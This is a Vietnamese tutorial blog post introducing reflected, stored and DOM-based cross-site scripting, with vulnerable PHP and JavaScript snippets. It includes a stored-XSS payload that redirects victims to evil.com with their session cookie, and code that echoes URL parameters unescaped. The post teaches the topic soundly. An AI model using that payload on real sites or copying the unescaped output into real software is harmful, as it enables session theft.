---
title: XSS là gì part 1 
date: 2025-03-18 18:20:13
tags: [Blog, XSS]
categories: [Công nghệ, Lập trình, Security]
author: Đạt
description: Những khái niệm cơ bản cần biết về XSS 
---

XSS đáng sợ hơn bạn nghĩ 

Bạn nghĩ XSS là lấy được phiên đăng nhập của người dùng ? 
XSS (Cross-Site Scripting) không chỉ để lấy session cookie của người dùng mà còn có thể:
✅ Đánh cắp thông tin (session, token, dữ liệu nhạy cảm)
✅ Chèn mã độc (keylogger, phishing, trojan)
✅ Thực thi lệnh từ phía client (DOM manipulation, redirect, fake UI)
✅ Thực hiện CSRF (Cross-Site Request Forgery) gián tiếp



<table>
  <thead>
    <tr>
      <th>Loại XSS</th>
      <th>Cơ chế tấn công</th>
      <th>Cách khai thác</th>
      <th>Mức độ nguy hiểm</th>
      <th>Đặc điểm chính</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><b>Reflected XSS</b></td>
      <td>Script độc hại được phản hồi ngay lập tức trong HTTP response.</td>
      <td>Hacker gửi link chứa payload, dụ nạn nhân click vào.</td>
      <td>⭐⭐ (Trung bình)</td>
      <td>- Không lưu trên server <br> - Chạy ngay khi user truy cập link.</td>
    </tr>
    <tr>
      <td><b>Stored XSS</b></td>
      <td>Script độc hại được lưu trữ trên server và thực thi khi user truy cập.</td>
      <td>Payload được chèn vào database, file log hoặc giao diện web.</td>
      <td>⭐⭐⭐ (Cao)</td>
      <td>- Lưu trên server <br> - Tự động thực thi khi có user truy cập.</td>
    </tr>
    <tr>
      <td><b>DOM-based XSS</b></td>
      <td>Script độc hại không đi qua server, mà được thực thi trên trình duyệt qua DOM.</td>
      <td>Thay đổi DOM bằng JavaScript không an toàn (<code>innerHTML</code>, <code>eval()</code>).</td>
      <td>⭐⭐⭐ (Cao)</td>
      <td>- Không xuất hiện trong HTTP response <br> - Tấn công thuần client-side.</td>
    </tr>
  </tbody>
</table>


<h2>1. Reflected XSS</h2>

Tại sao nó lại được gọi là Reflected XSS?
Reflected XSS được gọi là "Reflected" (phản chiếu) vì payload không được lưu trữ trên server mà phản hồi ngay lập tức trong HTTP response.
Khi người dùng truy cập một URL chứa mã độc, server trả lại nội dung có chứa script mà hacker gửi lên, và script này sẽ được thực thi ngay trên trình duyệt của nạn nhân.
Reflected XSS có nghĩa là payload XSS không được lưu trữ trên server mà phản chiếu trực tiếp trong HTTP response. Kiểu tấn công này yêu cầu hacker phải lừa nạn nhân nhấp vào link hoặc gửi request độc hại để mã JavaScript được thực thi trên trình duyệt của họ.

Ta có source code của trang web:
<img src="/images/XSS-la-gi/1.png"/>

Dễ thấy rằng nó có 1 input để nhập vào, nhưng không có bất kì kiểm tra nào, và nó sẽ được gửi đến trang web.

<?php
session_start();
if (isset($_GET['name'])) {
    echo 'Hello ' . $_GET['name'];
}
?>

Vấn đề sẽ phát sinh khi attacker thay vì nhập 1 tên bình thường thì lại gửi request như sau:

<img src="/images/XSS-la-gi/2.png" />

Session ID của user đã bị phơi bày, đây là ví dụ về loại phổ biến nhất của XSS: Reflected XSS cho thấy cách hoạt động của XSS, thực tế hacker thường lợi dụng XSS để gửi request chứa cookie cũng như các thông tin nhạy cảm về server của hacker.

<h2>2. Stored XSS</h2>

Stored XSS (hay Persistent XSS) là một kiểu tấn công XSS trong đó mã độc được lưu trữ trên server và tự động thực thi mỗi khi người dùng truy cập vào trang có chứa mã đó.

Ví dụ Stored XSS:
Hacker nhập đoạn script sau vào một ô nhập bình luận trên website:


```html
<script>document.location='http://evil.com/steal?cookie='+document.cookie;</script>
```

Nếu trang web không kiểm tra đầu vào mà lưu bình luận này vào database, bất kỳ ai xem bình luận đó sẽ bị đánh cắp cookie.

Điều gì xảy ra nếu 1 bài viết trên FB bị lỗi stored XSS ???  <img src="/images/meme/hacker.png"/>

<h2>3. DOM based XSS</h2>

DOM : (Document Object Model) là một mô hình dữ liệu thể hiện cấu trúc của một trang web dưới dạng cây phân cấp. Nó giúp JavaScript có thể truy cập, chỉnh sửa hoặc thêm/xóa nội dung HTML một cách linh hoạt.
📌 Hiểu đơn giản hơn:
🔹 Khi bạn mở một trang web, trình duyệt sẽ biến đổi HTML thành một cây DOM.
🔹 Mỗi thẻ HTML trở thành một nút (node) trong cây.
🔹 JavaScript có thể tương tác với các nút này để thay đổi nội dung trang web.
```html
<!DOCTYPE html>
<html>
<head>
    <title>Ví dụ DOM</title>
</head>
<body>
    <h1 id="greeting">Chào bạn!</h1>
    <button onclick="changeText()">Nhấn để thay đổi</button>

    <script>
        function changeText() {
            document.getElementById("greeting").innerText = "Hello, DOM!";
        }
    </script>
</body>
</html>
```

Giải thích:
document.getElementById("greeting") → Truy cập thẻ `<h1>` có id="greeting".
.innerText = "Hello, DOM!" → Thay đổi nội dung của thẻ `<h1>`.
🛠 Khi bạn nhấn nút, dòng chữ "Chào bạn!" sẽ đổi thành "Hello, DOM!".



```html
<script>
    var params = new URLSearchParams(window.location.search);
    var name = params.get('name');
    if (name) {
        document.write('Hello ' + name);
    }
</script>
```

Khi gửi request có chứa tham số ‘name’, server sẽ dùng DOM (Document Object Model) để lấy giá trị của tham số ‘name’ và viết lời chào lên browser.
Khi hacker gửi request chứa mã độc, script sẽ được thực thi:
<img src="/images/XSS-la-gi/3.png" />

Tuy nhiên, điều đáng nói ở đây, và cũng là điểm khác biệt của DOM based XSS là mã độc được thực thi do đoạn Javascript phía client mà không cần server xử lý request. Kết quả là response trả về không hề chứa đoạn script của hacker. Bạn đọc sẽ thấy được điều này khi view-source trang web:

Bạn đọc đã thấy được sự khác nhau của DOM based XSS và Reflected XSS chứ. Thế nhưng bạn sẽ thắc mắc rằng sự khác biệt này thì có ý nghĩa gì. Thật ra là có đấy. Trình duyệt web Google Chrome có một tính năng bảo mật được bật mặc định là XSS Auditor, nó là 1 filter của browser, có chức năng ngăn chặn cuộc tấn công XSS. Browser sẽ kiểm tra xem trong request mà client gửi lên có chứa mã độc không, nó sẽ so sánh script này với nội dung response từ server. Nếu script từ request giống với response, XSS Auditor sẽ nhận biết đây là một cuộc tấn công XSS và block đoạn script này.
Bonus: 🔥 Google Chrome đã loại bỏ XSS Auditor từ phiên bản 78 (2019) vì cơ chế này có nhiều hạn chế và đôi khi gây false positive (chặn nhầm).
Hiện tại, các cơ chế bảo vệ XSS chủ yếu dựa vào Content Security Policy (CSP), chứ không còn phụ thuộc vào XSS Auditor nữa.

